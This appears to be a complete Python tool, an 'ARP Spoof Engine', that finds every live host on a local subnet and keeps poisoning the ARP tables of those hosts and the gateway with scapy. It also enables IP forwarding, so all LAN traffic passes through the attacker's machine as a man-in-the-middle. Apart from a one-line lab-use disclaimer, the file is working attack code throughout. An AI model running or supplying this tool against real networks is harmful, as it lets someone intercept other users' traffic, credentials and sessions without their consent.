#!/usr/bin/env python3
"""
ARP Spoof Engine - intercepts all LAN traffic through this machine.
Controlled lab use only. Run as Administrator.
"""
import time
import threading
import subprocess
import platform
import logging
import re

log = logging.getLogger(__name__)

_running      = False
_spoof_thread = None

# Explicit Wi-Fi interface (Intel Dual Band Wireless-AC 8265)
WIFI_IFACE = iface="\\Device\\NPF_{E40F339E-DE89-485A-8B78-E49A7F7C76FD}"


def _get_mac_from_cache(ip: str):
    """Read MAC from Windows ARP cache (arp -a) — works on Wi-Fi."""
    try:
        out = subprocess.check_output(f"arp -a {ip}", shell=True).decode(errors="ignore")
        match = re.search(r"([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})", out, re.IGNORECASE)
        if match:
            return match.group(1).replace("-", ":")
    except Exception:
        pass
    return None


def _ping_then_get_mac(ip: str):
    """Ping IP to populate ARP cache, then read MAC from cache."""
    try:
        subprocess.run(f"ping -n 1 -w 1000 {ip}", shell=True,
                       capture_output=True)
    except Exception:
        pass
    return _get_mac_from_cache(ip)


def _get_gateway():
    """Auto-detect default gateway IP."""
    try:
        out = subprocess.check_output("ipconfig", shell=True).decode(errors="ignore")
        match = re.search(r"Default Gateway[^\d]*(\d+\.\d+\.\d+\.\d+)", out)
        return match.group(1) if match else None
    except Exception:
        return None


def _scan_hosts(subnet: str):
    """
    Ping sweep to populate ARP cache, then read all entries.
    Works on Wi-Fi where ARP broadcast replies are filtered.
    """
    print(f"[ARP] Pinging {subnet}.0/24 to populate ARP cache...")
    # Ping all hosts in subnet quickly
    threads = []
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        t = threading.Thread(
            target=lambda h: subprocess.run(
                f"ping -n 1 -w 300 {h}", shell=True, capture_output=True),
            args=(ip,), daemon=True
        )
        threads.append(t)
        t.start()
    # Wait for pings to finish
    for t in threads:
        t.join(timeout=2)

    # Read full ARP cache
    print("[ARP] Reading ARP cache for live hosts...")
    try:
        out = subprocess.check_output("arp -a", shell=True).decode(errors="ignore")
        hosts = []
        for line in out.splitlines():
            # Match lines like: 192.168.1.5    aa-bb-cc-dd-ee-ff    dynamic
            m = re.match(
                r"\s+(\d+\.\d+\.\d+\.\d+)\s+([\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2}[-:][\da-f]{2})\s+dynamic",
                line, re.IGNORECASE
            )
            if m:
                ip  = m.group(1)
                mac = m.group(2).replace("-", ":")
                if ip.startswith(subnet):
                    hosts.append((ip, mac))
        return hosts
    except Exception:
        return []


def _spoof(target_ip, target_mac, spoof_ip):
    """Tell target that spoof_ip is at our MAC (poisoning)."""
    from scapy.all import sendp, Ether, ARP
    sendp(
        Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
              hwdst=target_mac, psrc=spoof_ip),
        iface=WIFI_IFACE, verbose=False
    )


def _restore(target_ip, target_mac, real_ip, real_mac):
    """Send correct ARP reply to undo poisoning."""
    from scapy.all import sendp, Ether, ARP
    sendp(
        Ether(dst=target_mac) / ARP(op=2, pdst=target_ip,
              hwdst=target_mac, psrc=real_ip, hwsrc=real_mac),
        iface=WIFI_IFACE, count=5, verbose=False
    )


def _enable_ip_forward():
    """Enable IP forwarding so packets are relayed, not dropped."""
    if platform.system() == "Windows":
        subprocess.run([
            "reg", "add",
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
            "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"
        ], capture_output=True)
        print("[ARP] IP forwarding enabled (Windows)")
    else:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[ARP] IP forwarding enabled (Linux)")


def start_spoofing(subnet: str = "192.168.1") -> bool:
    """Start ARP spoofing all hosts on subnet."""
    global _running, _spoof_thread

    if _running:
        print("[ARP] Already running.")
        return True

    _enable_ip_forward()

    gateway_ip = _get_gateway()
    if not gateway_ip:
        print("[ARP] Could not detect gateway.")
        return False
    print(f"[ARP] Gateway: {gateway_ip}")

    # Use ping+cache instead of raw ARP request (works on Wi-Fi)
    gateway_mac = _ping_then_get_mac(gateway_ip)
    if not gateway_mac:
        print("[ARP] Could not get gateway MAC from ARP cache.")
        return False
    print(f"[ARP] Gateway MAC: {gateway_mac}")

    hosts = [
        (ip, mac) for ip, mac in _scan_hosts(subnet)
        if ip != gateway_ip
    ]
    if not hosts:
        print("[ARP] No hosts found on subnet.")
        return False
    print(f"[ARP] Intercepting {len(hosts)} hosts: {[h[0] for h in hosts]}")

    _running = True

    def _loop():
        while _running:
            for host_ip, host_mac in hosts:
                _spoof(host_ip,    host_mac,    gateway_ip)
                _spoof(gateway_ip, gateway_mac, host_ip)
            time.sleep(2)

        # Cleanup
        print("[ARP] Restoring ARP tables...")
        for host_ip, host_mac in hosts:
            real_mac = _ping_then_get_mac(host_ip) or host_mac
            _restore(host_ip,    host_mac,    gateway_ip, gateway_mac)
            _restore(gateway_ip, gateway_mac, host_ip,    real_mac)
        print("[ARP] ARP tables restored. Spoofing stopped.")

    _spoof_thread = threading.Thread(target=_loop, daemon=True, name="arp-spoof")
    _spoof_thread.start()
    return True


def stop_spoofing():
    global _running
    _running = False